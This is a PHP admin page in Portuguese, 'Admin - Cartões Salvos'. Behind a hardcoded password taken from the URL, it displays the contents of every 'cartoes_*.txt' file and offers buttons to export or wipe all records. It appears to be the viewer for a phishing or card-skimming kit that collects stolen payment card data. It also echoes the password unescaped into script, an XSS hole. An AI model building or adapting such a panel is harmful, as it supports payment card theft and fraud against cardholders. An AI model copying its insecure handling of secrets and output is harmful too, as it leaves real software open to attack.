<?php
// admin_txt.php
$senha = $_GET['senha'] ?? '';
$senha_correta = '777ga30';

if ($senha !== $senha_correta) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Acesso Restrito</title>
        <style>
            body {
                background: linear-gradient(135deg, #1a1a2e, #16213e);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                font-family: monospace;
            }
            .login-box {
                background: #0f3460;
                padding: 40px;
                border-radius: 20px;
                text-align: center;
                border-left: 4px solid #ffb600;
            }
            h1 { color: #ffb600; }
            input { padding: 10px; margin: 20px 0; border-radius: 8px; border: none; width: 100%; }
            button { background: #ffb600; color: #004aad; padding: 10px 30px; border: none; border-radius: 8px; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>🔒 ACESSO RESTRITO</h1>
            <form method="GET">
                <input type="password" name="senha" placeholder="Digite a senha">
                <button type="submit">ENTRAR</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Listar todos os arquivos .txt
$arquivos = glob('cartoes_*.txt');
rsort($arquivos); // Ordenar do mais recente para o mais antigo

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Cartões Salvos</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', monospace;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 20px;
            color: #fff;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { text-align: center; margin-bottom: 20px; color: #ffb600; }
        .stats {
            background: #0f3460;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
        }
        .stat-card {
            background: #16213e;
            padding: 10px 20px;
            border-radius: 8px;
            border-left: 4px solid #ffb600;
        }
        .card {
            background: #0f3460;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 15px;
            border-left: 4px solid #ffb600;
            transition: transform 0.2s;
        }
        .card:hover { transform: translateX(5px); }
        .card h3 { color: #ffb600; margin-bottom: 10px; }
        .card p { margin: 5px 0; font-size: 14px; }
        .card .label { color: #888; }
        button {
            background: #ffb600;
            color: #004aad;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 20px;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
        .btn-danger { background: #dc3545; color: white; }
        .btn-danger:hover { background: #c82333; }
        .logout { text-align: right; margin-bottom: 15px; }
        .logout a { color: #ffb600; text-decoration: none; font-size: 12px; }
        .empty { text-align: center; padding: 40px; background: #0f3460; border-radius: 12px; }
        footer { text-align: center; margin-top: 30px; padding: 20px; color: #888; font-size: 12px; }
        pre {
            background: #1a1a2e;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logout"><a href="?">🚪 Sair</a></div>
        <h1>📋 ADMIN - CARTÕES SALVOS</h1>
        <div class="stats">
            <div class="stat-card">📊 Total de registros: <?php echo count($arquivos); ?></div>
            <div class="stat-card">📅 Último arquivo: <?php echo isset($arquivos[0]) ? date('d/m/Y H:i:s', filemtime($arquivos[0])) : 'Nenhum'; ?></div>
        </div>
        
        <button onclick="exportarTudo()">📎 Exportar Todos os Dados</button>
        <button class="btn-danger" onclick="limparTudo()">🗑️ Limpar Todos os Registros</button>
        
        <div id="lista-cartoes">
            <?php if (empty($arquivos)): ?>
                <div class="empty">📭 Nenhum cartão salvo ainda</div>
            <?php else: ?>
                <?php foreach ($arquivos as $arquivo): ?>
                    <div class="card">
                        <h3>📄 <?php echo $arquivo; ?></h3>
                        <pre><?php echo htmlspecialchars(file_get_contents($arquivo)); ?></pre>
                    </div>
                <?php endforeach; ?>
            <?php endif; ?>
        </div>
        <footer>⚠️ Acesso restrito - Apenas administradores</footer>
    </div>
    
    <script>
        function exportarTudo() {
            window.location.href = 'exportar_todos.php?senha=<?php echo $senha; ?>';
        }
        
        function limparTudo() {
            if (confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os registros. Continuar?')) {
                window.location.href = 'limpar_todos.php?senha=<?php echo $senha; ?>';
            }
        }
    </script>
</body>
</html>